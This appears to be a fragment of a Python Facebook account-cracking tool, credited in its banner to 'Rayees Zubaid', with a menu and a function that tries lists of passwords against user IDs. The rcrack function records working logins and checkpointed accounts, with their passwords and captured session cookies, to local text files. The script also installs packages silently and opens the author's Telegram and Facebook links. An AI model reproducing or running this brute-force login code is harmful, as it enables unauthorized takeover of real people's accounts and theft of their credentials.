...
try:
    ...
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
print('\n\033[1;32m[•]   JOIN MY TELEGRAM iL');time.sleep(1)
os.system('xdg-open https://t.me/Zubaid')
print('\n\033[1;36m[•]   WELCOME TO RAYEES Zubaid TOOL...');time.sleep(3)
...
|_____ $$           | $$                |__/      | $$
  ...
  /$$/    | $$  | $$| $$  | $$ /$$__  $$| $$| $$  | $$
 /$$$$$$$$|  $$$$$$/| $$$$$$$/|  $$$$$$$| $$|  $$$$$$$
|________/ \______/ |_______/  \_______/|__/ \_______/
                                                                                                 
\x1b[1;97m-----------------------------------------------------
\x1b[1;97m[\x1b[1;95m•\x1b[1;97m] \x1b[1;94mAUTHOR   \x1b[1;95m: \x1b[1;94m Rayees Zubaid 
\x1b[1;97m[\x1b[1;95m•\x1b[1;97m] \x1b[1;94mFACEBOOK \x1b[1;95m: \x1b[1;94Rayees Zubaid
\x1b[1;97m[\x1b[1;95m•\x1b[1;97m] \x1b[1;94mWHATSAPP \x1b[1;95m: \x1b[1;94m+937🥰🥰🥰🥰🥰🥰   
\x1b[1;97m[\x1b[1;95m•\x1b[1;97m] \x1b[1;94mTelegram \x1b[1;95m: \x1b[1;94m zubaid jan
\x1b[1;97m[\x1b[1;95m•\x1b[1;97m] \x1b[1;94mGITHUB   \x1b[1;95m: \x1b[1;94not have
\x1b[1;97m[\x1b[1;95m•\x1b[1;97m] \x1b[1;94mVERSION  \x1b[1;95m:\x1b[1;92m 0.9       
\x1b[1;97m-----------------------------------------------------    """)
...
def riaz():
	...
	if riaz1 =='0':
		exit()
	if riaz1 =='3':
		os.system('xdg-open https://facebook.com/profile.php?id=1')
	if riaz1 =='2':
		bangla()
	else:
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r[\033[1;97mZubaid\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
    ...
    # 'cookie': 'datr=v8iSZbjn_ttgU7GbCZgLLt0q; sb=v8iSZWNTMz_woyb0wzzFQfRF; fr=0B4zSBG9EPumXagsf..Blksi_.is.AAA.0.0.BlnCQy.AWWKssAMxdo; wd=891x837; dpr=4.397787570953369',
    'origin': 'https://www.facebook.com',
    'referer': 'https://www.facebook.com/?wtsid=rdr_0k998B4w0BJ4nv8dk&_rdr',
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Zubaid -OK] '+cid+' | '+ps+'\033[0;97m\n[‎‎🥰]\033[1;33m 🅲︎🅾︎🅾︎🅺︎🅸︎🅴︎ = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('Zubaid -OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[Zubaid -CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('Zubaid-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
